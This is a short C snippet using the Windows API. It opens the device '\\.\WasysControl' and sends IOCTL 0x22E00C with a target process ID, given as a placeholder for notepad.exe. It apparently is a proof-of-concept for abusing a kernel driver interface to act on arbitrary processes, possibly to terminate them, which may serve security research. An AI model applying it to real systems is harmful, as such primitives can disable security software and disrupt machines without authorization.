HANDLE hDevice = CreateFileW(
    L"\\\\.\\WasysControl",
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    0,
    NULL
);

DWORD targetPid = /* PID of notepad.exe */;
DWORD bytesReturned;

DeviceIoControl(
    hDevice,
    0x22E00C,        // IOCTL code
    &targetPid,      // input: 4-byte PID
    sizeof(DWORD),   // input size (must be >= 4)
    NULL,            // no output
    0,
    &bytesReturned,
    NULL
);